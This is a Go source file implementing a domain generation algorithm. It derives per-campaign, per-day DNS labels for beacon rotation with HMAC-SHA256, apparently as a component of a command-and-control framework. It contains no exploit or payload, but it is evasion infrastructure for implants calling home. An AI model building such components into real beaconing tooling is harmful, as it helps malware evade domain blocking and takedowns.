// Package dga derives the per-campaign, per-day DNS labels used for beacon
// rotation. It is a pure function of (seed, campaign, UTC day, index): no clock
// read, no stored state, and no path from a label back to the seed. The seed is
// only ever an HMAC key and never appears in a label or an error.
package dga

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base32"
	"encoding/binary"
	"errors"
	"fmt"
	"strings"
	"time"
)

const (
	// minSeedBytes matches the SHA-256 security target. A shorter key would
	// make the derived labels brute-forceable without ever touching the DB.
	minSeedBytes = 32
	// maxLabels bounds one day's derivation: a caller asking for more than 64
	// is more likely looping on a bug than legitimately needing the output.
	maxLabels = 64
	// maxLabelLen is the DNS wire limit for a single label.
	maxLabelLen = 63
	// maxNameLen is the DNS presentation limit for a name, root dot excluded.
	maxNameLen = 253
)

const dayLayout = "2006-01-02"

// campaignDomain separates campaign subkey derivation from label derivation.
// Its trailing NUL keeps the domain string from ever being a prefix of a
// campaign ID in the HMAC message.
const campaignDomain = "siren/dga/campaign/v1\x00"

// labelEncoding is base32 over the 32 characters left after removing the
// glyphs that are confusable when read aloud or in a log: 0/o and 1/l. The
// remaining letters contribute 24 symbols and the remaining digits 8, exactly
// 32. No padding: the output is a DNS label, not a transport token.
var labelEncoding = base32.NewEncoding("abcdefghijkmnpqrstuvwxyz23456789").WithPadding(base32.NoPadding)

// Labels derives n independent labels for one campaign on one UTC day.
//
// Each campaign gets its own HMAC subkey derived from the master seed and the
// campaign ID. That is the collision fix: two campaigns sharing the same seed,
// apex and day still derive disjoint labels, so a misconfigured shared apex
// cannot make two campaigns answer on the same name.
//
// The HMAC message is the truncated day, a NUL separator, then the index as a
// big-endian uint32. The separator and the fixed-width counter make the message
// unambiguous. The index is part of the message, not the key, so asking for a
// larger n never rewrites the labels already published: the first eight of a
// 64-label derivation are the eight labels of an 8-label derivation.
//
// The seed is copied before use so a caller reusing or mutating the slice cannot
// influence a later iteration. The copy and the derived subkey are cleared
// before return and never logged.
func Labels(seed []byte, campaign string, day time.Time, n int) ([]string, error) {
	if len(seed) < minSeedBytes {
		return nil, fmt.Errorf("dga: seed is %d bytes; minimum is %d", len(seed), minSeedBytes)
	}
	if campaign == "" {
		return nil, errors.New("dga: campaign is empty")
	}
	if n <= 0 || n > maxLabels {
		return nil, fmt.Errorf("dga: count %d is outside 1..%d", n, maxLabels)
	}

	key := append([]byte(nil), seed...)
	defer clear(key)
	subkey := campaignKey(key, campaign)
	defer clear(subkey)

	dayKey := day.UTC().Format(dayLayout)
	labels := make([]string, n)
	for i := range labels {
		mac := hmac.New(sha256.New, subkey)
		mac.Write([]byte(dayKey))
		mac.Write([]byte{0})
		var counter [4]byte
		binary.BigEndian.PutUint32(counter[:], uint32(i))
		mac.Write(counter[:])

		label := labelEncoding.EncodeToString(mac.Sum(nil))
		// The alphabet excludes '-' at both ends by construction, but the
		// contract is checked here so a future alphabet edit cannot ship an
		// invalid label silently.
		if !validLabel(label) {
			return nil, errors.New("dga: derived label is not a valid DNS label")
		}
		labels[i] = label
	}
	return labels, nil
}

// campaignKey derives the per-campaign subkey. The campaign ID is the HMAC
// message after a fixed domain separator; distinct IDs therefore produce
// distinct keys, even when the master seed is shared.
func campaignKey(seed []byte, campaign string) []byte {
	mac := hmac.New(sha256.New, seed)
	mac.Write([]byte(campaignDomain))
	mac.Write([]byte(campaign))
	return mac.Sum(nil)
}

// Full appends apex to every label and returns fully qualified names. The apex
// is validated, never normalised: an uppercase apex is an error rather than
// something silently lowercased, because a caller that passed the wrong value
// should find out before a campaign goes live.
func Full(apex string, labels []string) ([]string, error) {
	if err := validateApex(apex); err != nil {
		return nil, err
	}
	out := make([]string, len(labels))
	for i, label := range labels {
		if !validLabel(label) {
			return nil, fmt.Errorf("dga: label %d is not a valid DNS label", i)
		}
		name := label + "." + apex
		if len(name) > maxNameLen {
			return nil, fmt.Errorf(
				"dga: apex is %d bytes and cannot accommodate label %d (%d bytes) within %d bytes",
				len(apex), i, len(label), maxNameLen,
			)
		}
		out[i] = name
	}
	return out, nil
}

func validateApex(apex string) error {
	if apex == "" {
		return errors.New("dga: apex is empty")
	}
	if len(apex) > maxNameLen {
		return fmt.Errorf("dga: apex is %d bytes; maximum is %d", len(apex), maxNameLen)
	}
	if apex != strings.ToLower(apex) {
		return fmt.Errorf("dga: apex %q is not lowercase", apex)
	}
	for _, label := range strings.Split(apex, ".") {
		if !validLabel(label) {
			return fmt.Errorf("dga: apex label %q is not a valid DNS label", label)
		}
	}
	return nil
}

// validLabel applies the DNS presentation rules used by both derivation and
// Full: 1..63 bytes, [a-z0-9-], and an alphanumeric first and last byte. Only
// lowercase is accepted. DNS itself is case-insensitive, but this contract is
// not: two spellings of one beacon would be two cache keys.
func validLabel(label string) bool {
	if label == "" || len(label) > maxLabelLen {
		return false
	}
	if !isAlnum(label[0]) || !isAlnum(label[len(label)-1]) {
		return false
	}
	for i := 0; i < len(label); i++ {
		c := label[i]
		if isAlnum(c) || c == '-' {
			continue
		}
		return false
	}
	return true
}

func isAlnum(c byte) bool {
	return (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9')
}
